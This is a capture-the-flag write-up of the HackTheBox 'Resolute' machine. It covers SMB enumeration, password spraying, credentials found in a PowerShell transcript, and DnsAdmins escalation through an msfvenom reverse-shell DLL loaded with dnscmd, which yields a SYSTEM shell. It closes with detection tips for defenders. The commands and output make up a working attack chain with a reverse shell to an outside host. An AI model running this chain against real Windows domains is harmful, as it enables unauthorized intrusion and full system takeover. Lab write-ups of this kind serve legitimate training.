---
author:
  name: "Astrah"
date: 2020-12-23
linktitle: Resolute Windows
type:
- post
- posts
categories:
- Windows
tags:
- Windows
- AD
- HackTheBox
- Active Directory
title: Resolute Exploitation HackTheBox
weight: 10
series:
- Windows Exploitation
---
# Resolute
![](/images/resolute.png)
**Summary**
- Running enum4linux gave usernames .
- Got password for a user marko but turned out to be melanie's.
- Logged in as melanie using evil-winrm
- Got user.txt flag
- Manual enumeration into directories and got some hidden files
- Got password for user ryan from a file.
- Switched to ryan
- User is in the group of dnsadmin
- Crafting malicious dll file for dll-injection
- Starting the smb server using impacket smbserver.py
- Setting up the path for /serverlevelplugindll to my dll
- Stoping and starting the service dns
- Got root.txt

**masscan results**

```ruby
❯ sudo masscan --rate=1000 -e tun0 -p0-65535 10.10.10.169
[sudo] password for astrah: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-12-22 18:42:03 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 49666/tcp on 10.10.10.169                                 
Discovered open port 49664/tcp on 10.10.10.169                                 
Discovered open port 636/tcp on 10.10.10.169                                   
Discovered open port 49665/tcp on 10.10.10.169                                 
Discovered open port 49688/tcp on 10.10.10.169                                 
Discovered open port 49776/tcp on 10.10.10.169                                 
Discovered open port 593/tcp on 10.10.10.169                                   
Discovered open port 464/tcp on 10.10.10.169                                   
Discovered open port 49667/tcp on 10.10.10.169                                 
Discovered open port 53/tcp on 10.10.10.169                                    
Discovered open port 5985/tcp on 10.10.10.169                                  
Discovered open port 9389/tcp on 10.10.10.169                                  
Discovered open port 3268/tcp on 10.10.10.169                                  
Discovered open port 49677/tcp on 10.10.10.169                                 
Discovered open port 88/tcp on 10.10.10.169                                    
Discovered open port 445/tcp on 10.10.10.169                                   
Discovered open port 139/tcp on 10.10.10.169                                   
Discovered open port 49671/tcp on 10.10.10.169                                 
Discovered open port 389/tcp on 10.10.10.169                                   
Discovered open port 135/tcp on 10.10.10.169                                   
Discovered open port 3269/tcp on 10.10.10.169                                  
Discovered open port 49819/tcp on 10.10.10.169                                 
Discovered open port 49676/tcp on 10.10.10.169                                 
Discovered open port 47001/tcp on 10.10.10.169
``` 
**nmap for more info**
```ruby
❯ sudo nmap -sV -sC -Pn -oN nmap 10.10.10.169
[sudo] password for astrah: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-22 13:44 EST
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.29s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-12-22 18:55:49Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```


Smb was enumerated first using **enum4linux**.
The following users were found and saved them into user.txt
![](/images/enum4linux.png)

Going through the enum4linux results i also found a password

`index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!`

using crackmapexec bruteforcing was done on smb using the collected users and the password
```ruby
❯ crackmapexec smb 10.10.10.169 -u user.txt -p Welcome123!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123!
``` 
Turned out the password was correct for user melanie **melanie:Welcome123!**

Using smbmap shares were listed but nothing interesting was found.


![](/images/smbmap.png)
Remote access was tried on the machine using the creds and it was successfull


![](/images/melanie_evilwinrm.png)

The user.txt flag


![](/images/user..png)

**Privilege Escalation**

Finding users of the system
```ruby
C:\Users\melanie> net user

User accounts for 
abigail                  Administrator            angela
annette                  annika                   claire
claude                   DefaultAccount           felicia
fred                     Guest                    gustavo
krbtgt                   marcus                   marko
melanie                  naoki                    paulo
per                      ryan                     sally
simon                    steve                    stevie
sunita                   ulf                      zach
```

Manually enumerating the directories an interesting directory was discovered.


![](/images/pstranscripts.png)

Digging further into the directory, a file was found
```ruby
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force
    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
Inside credentials of ryan was found


![](/images/ryan.png)

credentials--> **ryan:Serv3r4Admin4cc123!**

After successfull remote login suing the creds, **whoami /all** was ran and interestingly ryan was a member of **DnsAdmins**
Another way to check the group of a user is **(Get-ADUser userName –Properties MemberOf).MemberOf** or **net user userName /domain**
```ruby
GROUP INFORMATION
Group Name                                 Type             SID                                            Attributes

Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

After some googling, a blog was found that explained how to privesc using members of dnsadmins [here](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)

so a dll payload was created using msfvenom
```ruby
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4443 --platform=windows -f dll > privesc.dll
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```


Then hosted the file using smb, hosting it with smb was chosen because windows supports UNC paths and samba shares by default in most cases. Also, **there are times when the victim’s AV or defender may delete the payload if uploaded**.

Created the smbserver using impackets smbserver.py as follows:
```ruby
❯ sudo smbserver.py SHARE .
[sudo] password for astrah: 
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Testing was done to see if the victim machine could access the share and it was successfull
```ruby
*Evil-WinRM* PS C:\Users\ryan\Documents> net view \\10.10.14.4
Shared resources at \\10.10.14.4

(null)
Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
SHARE       Disk
The command completed successfully.
```
Next, the below command was used on powershell to inject the generated payload
```ruby
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.4\SHARE\privesc.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
Then finally, restarting the dns server
```ruby
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3516
        FLAGS              :
```
And we got administrator shell
```ruby
❯ sudo nc -nlvp 4443
[sudo] password for astrah: 
listening on [any] 4443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.169] 53785
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


**For the BlueTeamers there are some ways to detect or prevent dnsadmin privesc**
   - To prevent the attack, audit ACL for write privilege to DNS server object and membership of DNSAdmins group.

    
-  Indicators like DNS service restart and couple of log entries:

    DNS Server Log Event ID 150 for failure and 770 for success

  
- Monitoring changes to HKLM:\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll will also help.



I Hope you found this helpful
